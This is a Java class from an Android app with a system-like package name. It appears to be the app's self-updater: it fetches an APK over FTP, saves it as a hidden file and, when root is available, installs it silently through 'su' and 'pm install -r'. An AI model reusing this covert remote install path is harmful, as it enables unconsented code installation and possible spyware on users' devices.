package com.telephony.services;

import java.io.File;
import java.io.IOException;
import java.io.StringReader;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class Updater {
	private MyFTPClient ftp = null;
	private Context context;
	private MyProperties props = null;
	private PreferenceUtils sPref = null;

	public static final String VER_PROP_FILE = "ver.prop";
	public static final String REMOTE_VER = "ver";
	public static final String APK_REMOTE_FILE = "apk";
	public static final String APK_REMOTE_DESCRIPTION = "description";

	public Updater(Context context, final MyFTPClient ftp) throws IOException {
		this.ftp = ftp;
		this.context = context;
		sPref = PreferenceUtils.getInstance(context);
		props = new MyProperties();
		props.load(new StringReader(Utils.implodeStrings(ftp.downloadFileStrings(VER_PROP_FILE), "\n")));
	}

	/**
	 * �������� ������ � ���������� �������
	 * 
	 * @return ������ VersionCode
	 */
	public int getRemoteVersion() {
		if (!props.isEmpty()) {
			return props.getIntProperty(REMOTE_VER, 0);
		}
		return 0;
	}

	/**
	 * �������� APK ��� ����� �� �������
	 * 
	 * @return ��� APK �����
	 */
	public String getAPKRemoteFile() {
		if (!props.isEmpty()) {
			return props.getProperty(APK_REMOTE_FILE, "");
		}
		return null;
	}

	/**
	 * �������� �������� ����������
	 * 
	 * @return �������� ����������
	 */
	public String getAPKRemoteDescription() {
		if (!props.isEmpty()) {
			return props.getProperty(APK_REMOTE_DESCRIPTION, "");
		}
		return null;
	}

	/**
	 * �������� ���������. ���� ���� root - �� �������� ����, ���� ��� - �� ������� ����������� � ����� ����������
	 * 
	 * @throws IOException
	 */
	public void updateAPK() throws IOException {
		long rfs = ftp.getFileSize(getAPKRemoteFile());
		boolean downloadSuccsess = true;
		if (rfs > 0) {
			File apk_file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), getAPKRemoteFile()));
			if (apk_file != null) {
				if ((apk_file.exists() && (apk_file.length() != rfs)) || (!apk_file.exists())) {
					downloadSuccsess = ftp.downloadFile(getAPKRemoteFile(), apk_file);
				}
				if (downloadSuccsess && apk_file.exists()) {
					if (Utils.checkRoot()) {
						new Proc("su").exec(new String[] { "pm install -r " + apk_file.getAbsolutePath() });
					} else {
						Intent intent = new Intent(Intent.ACTION_VIEW);
						intent.setDataAndType(Uri.fromFile(apk_file), "application/vnd.android.package-archive");
						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						Utils.show_notification(context, 0, getAPKRemoteDescription(), intent);
					}
				}
			}
		}

	}	

}
